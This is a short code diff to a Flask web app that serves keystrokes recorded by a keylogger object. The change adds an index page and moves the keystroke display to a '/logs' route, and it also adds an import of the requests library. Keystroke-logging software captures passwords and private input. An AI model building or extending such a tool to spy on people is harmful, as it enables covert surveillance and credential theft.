@@ -1,4 +1,4 @@
-from flask import Flask, render_template, Response
+from flask import Flask, render_template, Response,request
 import threading
 import keyboard
 import signal
@@ -9,6 +9,8 @@ from reportlab.lib.pagesizes import letter
 from reportlab.pdfgen import canvas
 import platform
 import socket
+import requests
+
 
 
 app = Flask(__name__)
@@ -101,8 +103,12 @@ def signal_handler(sig, frame):
 # Register the signal handler for SIGINT (Ctrl+C)
 signal.signal(signal.SIGINT, signal_handler)
 
-# Route to display logged keystrokes
+
 @app.route('/')
+def index():
+    return render_template('index.html')
+# Route to display logged keystrokes
+@app.route('/logs')
 def logged_keystrokes():
     keystrokes = keylogger.keystrokes
     return render_template('logged_keystrokes.html', title='Logged Keystrokes', keystrokes=keystrokes)
